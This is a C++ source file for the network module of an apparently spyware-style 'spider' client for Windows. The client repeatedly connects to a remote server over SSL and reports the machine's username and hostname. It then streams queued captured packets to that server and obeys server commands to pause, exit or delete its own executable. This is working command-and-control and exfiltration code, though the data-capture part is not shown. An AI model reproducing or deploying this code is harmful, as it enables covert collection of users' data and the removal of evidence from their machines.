#include <iostream>
#include <boost/thread.hpp>
#include <boost/filesystem.hpp>
#include <boost/date_time/posix_time/posix_time.hpp>
#include "reseau/Network.hh"
#include "paquetFirstClient.hh"
#include "paquetCommandServer.hh"
#include "paquetCommandClient.hh"

#ifndef CERTIFICATE_FILE
# define CERTIFICATE_FILE ("client.crt")
#endif

Network::Network(const std::string& port, const std::string& ip, Packager* packager) :
	_port(port), _ip(ip), _ctx(boost::asio::ssl::context::sslv23), _packager(packager)
{
	_pause = 0;

	boost::asio::ip::tcp::resolver resolver(_ios);
	boost::asio::ip::tcp::resolver::query query(ip, port);
	_iterator = resolver.resolve(query);

	_ctx.load_verify_file(CERTIFICATE_FILE);
	_ctx.set_verify_mode(boost::asio::ssl::context::verify_peer);
	_engine = new SslEngine(_ios, _ctx);

	_response[4] = nullptr;
	_response[5] = nullptr;
	_response[6] = &spider_exit;
	_response[7] = &spider_pause;
	_response[8] = &spider_remove;

}


Network::~Network() {
}

void Network::initNetwork() {
	boost::asio::spawn(_ios, [this](boost::asio::yield_context yield) {
		boost::asio::ip::tcp::endpoint endpoint = *_iterator;
		boost::system::error_code ec;

		for (;;) {
				std::cout << "Try to connect to the server" << std::endl;
				_engine->getSocket().async_connect(endpoint, yield[ec]);
				if (!ec) {
					std::cout << "SSL: initializing HandShake" << std::endl;
					_engine->doHandshake(boost::asio::ssl::stream_base::client, yield);
					if (!ec) {
						sendFirstPaquet(yield);
					}
				}
				_engine->getSocket().close();
		}});
	_ios.run();
}

void Network::sendFirstPaquet(boost::asio::yield_context yield)
{
	PaquetFirstClient	paquet;


	DWORD	size = 128;
	char hostName[128];
	char username[128];

	GetUserNameA(username, &size);
	gethostname(hostName, sizeof(hostName));

	paquet.setVersion(1);
	paquet.setName(std::string(username) + "@" + std::string(hostName));
	paquet.setDate(SelfUtils::secondsSinceEpoch());
	paquet.createPaquet();

	if (_engine->writePaquet(paquet, yield)) {
	  return ;
	}
	uint8_t id;
	uint8_t ret;
	if (_engine->async_read(&id, 1, yield)) {
	  return ;
	}
	if (_engine->async_read(&ret, 1, yield)) {
	  return ;
	}
	std::cout << "SSL: server RET value " << (int)ret << std::endl;
	if (ret == 2) {
		boost::thread readThread(&Network::readLoop, this, yield);
		writeLoop(yield);
		readThread.join();
	}
	else
	{
	  std::cerr << "SSl: Error: Wrong protocol version" << std::endl;
	}
}

void Network::writeLoop(boost::asio::yield_context yield)
{
	while (1) {

		_packager->isLeft();
		std::cout << "Packager OK" << std::endl;
		Paquet *paquet = _packager->getPaquet();
			if (_pause == 0) {
				std::cout << "SENDING PAQUET: " << *paquet << std::endl;
				if (_engine->writePaquet(*paquet, yield) == -1) {
					return;
				}
			}
		_packager->supprPaquet();
	}
}

void Network::readLoop(boost::asio::yield_context yield)
{
	PaquetCommandServer paquet;

	while (!_engine->read(paquet)) {
		if (paquet.getReponse() >= 4 && paquet.getReponse() <= 8)
			_response[paquet.getReponse()](*this, yield);
		else
		{
			PaquetCommandClient *paquet = new PaquetCommandClient();
			paquet->setOk(0);
			paquet->createPaquet();
			_engine->writePaquet(*paquet, yield);
		}
		std::cout << "Paquet recu: " << paquet << std::endl;
	}
}

void spider_exit(Network& net, boost::asio::yield_context yield) {
	PaquetCommandClient *paquet = new PaquetCommandClient();

	paquet->setOk(1);
	std::cout << "Exit spider" << std::endl;
	paquet->createPaquet();
	net.getEngine().writePaquet(*paquet, yield);
	exit(EXIT_SUCCESS);
}

void spider_remove(Network& net, boost::asio::yield_context yield) {
	PaquetCommandClient *paquet = new PaquetCommandClient();
	HMODULE		hModule = GetModuleHandle(NULL);

	if (hModule)
	{
		WCHAR	path[MAX_PATH];

		paquet->setOk(1);
		GetModuleFileName(hModule, path, MAX_PATH);
		std::wstring wpath = path;
		std::string str(wpath.begin(), wpath.end());
		std::cout << "Remove: " << str << std::endl;
		if (boost::filesystem::exists(str))
			boost::filesystem::remove(str);
	}
	else
		paquet->setOk(0);
	paquet->createPaquet();
	net.getEngine().writePaquet(*paquet, yield);
}

void spider_pause(Network& net, boost::asio::yield_context yield) {
	PaquetCommandClient *paquet = new PaquetCommandClient();

	paquet->setOk(1);
	if (net.getPause() == 0)
		net.setPause(1);
	else
		net.setPause(0);
	paquet->createPaquet();
	net.getEngine().writePaquet(*paquet, yield);
}